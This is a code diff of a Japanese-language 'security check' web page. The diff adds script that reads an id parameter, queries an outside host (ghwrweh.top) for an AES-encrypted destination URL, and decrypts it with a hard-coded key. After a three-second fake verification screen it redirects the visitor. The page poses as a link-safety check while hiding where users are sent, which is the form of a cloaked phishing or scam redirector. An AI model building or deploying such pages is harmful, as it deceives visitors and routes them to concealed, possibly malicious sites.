@@ -1,10 +1,10 @@
 <!DOCTYPE html>
 <html lang="ja">
 <head>
-  <meta charset="UTF-8">
+  <meta charset="UTF-8" />
   <title>セキュリティ確認中...</title>
-  <meta name="viewport" content="width=device-width, initial-scale=1.0">
-  <meta name="robots" content="noindex,nofollow">
+  <meta name="viewport" content="width=device-width, initial-scale=1.0" />
+  <meta name="robots" content="noindex,nofollow" />
   <style>
     body {
       font-family: "Segoe UI", "Hiragino Kaku Gothic ProN", sans-serif;
@@ -37,8 +37,29 @@
   <p>リンクの安全性を確認しています。まもなくページが表示されます。</p>
   <div class="loader"></div>
   <p class="caption">セキュア認証サービス</p>
+
   <script>
-    const AES_KEY = "5Ctianyoumabiiii";
+    const AES_KEY = "5Ctianyoumabiiii"; // 必须与后端一致
+    const query = new URLSearchParams(location.search);
+    const id = query.get("id");
+
+    if (!id) {
+      document.body.innerHTML += '<p style="color:red;">ID パラメータが見つかりません。</p>';
+    } else {
+      fetch("https://ghwrweh.top/api/jumpSite?siteName=" + encodeURIComponent(id))
+        .then(res => res.json())
+        .then(data => {
+          if (!data?.data?.siteUrl) throw new Error("No siteUrl");
+          decryptAES(data.data.siteUrl).then(url => {
+            setTimeout(() => {
+              location.href = url;
+            }, 3000);
+          });
+        })
+        .catch(() => {
+          document.body.innerHTML += '<p style="color:red;">リンク取得エラー。</p>';
+        });
+    }
 
     async function decryptAES(encText) {
       const base64 = encText.replace(/-/g, '+').replace(/_/g, '/');
@@ -52,35 +73,9 @@
         false,
         ["decrypt"]
       );
-      const decrypted = await crypto.subtle.decrypt(
-        { name: "AES-CBC", iv },
-        key,
-        data
-      );
+      const decrypted = await crypto.subtle.decrypt({ name: "AES-CBC", iv }, key, data);
       return new TextDecoder().decode(decrypted).replace(/\u0000+$/, '');
     }
-
-    async function start() {
-      const path = window.location.pathname;
-      const id = path.split('/').filter(Boolean).pop()?.split('.')[0];
-      if (!id) return;
-
-      const url = `/get_url?id=${encodeURIComponent(id)}`;
-      try {
-        const res = await fetch(url);
-        const json = await res.json();
-        if (json.enc) {
-          const realUrl = await decryptAES(json.enc);
-          setTimeout(() => location.href = realUrl, 3000);
-        } else {
-          document.body.innerHTML += "<p style='color:red'>リダイレクト失敗。</p>";
-        }
-      } catch (e) {
-        document.body.innerHTML += "<p style='color:red'>接続エラー。</p>";
-      }
-    }
-
-    start();
   </script>
 </body>
 </html>
